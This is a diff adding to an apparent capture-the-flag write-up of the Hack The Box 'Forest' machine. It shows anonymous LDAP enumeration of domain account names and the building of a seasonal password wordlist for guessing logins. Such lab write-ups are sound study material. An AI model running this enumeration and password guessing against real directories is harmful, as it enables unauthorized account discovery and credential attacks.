@@ -568,3 +568,76 @@ dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
  C=local
 sAMAccountName: andy
 ```
+
+
+
+```
+ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName 
+# requesting: sAMAccountName 
+sAMAccountName: Guest
+sAMAccountName: DefaultAccount
+sAMAccountName: FOREST$
+sAMAccountName: EXCH01$
+sAMAccountName: $331000-VK4ADACQNUCA
+sAMAccountName: SM_2c8eef0a09b545acb
+sAMAccountName: SM_ca8c2ed5bdab4dc9b
+sAMAccountName: SM_75a538d3025e4db9a
+sAMAccountName: SM_681f53d4942840e18
+sAMAccountName: SM_1b41c9286325456bb
+sAMAccountName: SM_9b69f1b9d2cc45549
+sAMAccountName: SM_7c96b981967141ebb
+sAMAccountName: SM_c75ee099d0a64c91b
+sAMAccountName: SM_1ffab36a2f5f479cb
+sAMAccountName: HealthMailboxc3d7722
+sAMAccountName: HealthMailboxfc9daad
+sAMAccountName: HealthMailboxc0a90c9
+sAMAccountName: HealthMailbox670628e
+sAMAccountName: HealthMailbox968e74d
+sAMAccountName: HealthMailbox6ded678
+sAMAccountName: HealthMailbox83d6781
+sAMAccountName: HealthMailboxfd87238
+sAMAccountName: HealthMailboxb01ac64
+sAMAccountName: HealthMailbox7108a4e
+sAMAccountName: HealthMailbox0659cc1
+sAMAccountName: sebastien
+sAMAccountName: lucinda
+sAMAccountName: andy
+sAMAccountName: mark
+sAMAccountName: santi
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# nvim userlist.ldap 
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# nvim              
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# nvim pass         
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# for i in $(cat pass); do echo $i; echo ${i}2019; echo ${i}2020; done
+January
+January2019
+January2020
+February
+February2019
+February2020
+March
+March2019
+March2020
+April
+April2019
+April2020
+May
+May2019
+May2020
+June
+June2019
+June2020
+July
+
+---------------------------------------------------------snip-------------------------------------
+```
